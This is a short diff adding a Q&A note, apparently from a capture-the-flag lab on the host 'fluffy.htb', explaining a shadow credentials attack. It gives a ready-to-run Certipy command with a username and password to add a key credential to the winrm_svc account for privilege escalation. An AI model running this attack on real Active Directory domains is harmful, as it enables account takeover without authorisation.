@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you perform a shadow credential attack?
+
+CONTEXT:
+You have GenericWrite privileges over the winrm_svc account.
+
+METHOD / ANSWER:
+Command: `certipy shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc`
+Explanation: This command uses Certipy to add a key credential to the winrm_svc account, allowing for further access privilege escalation.
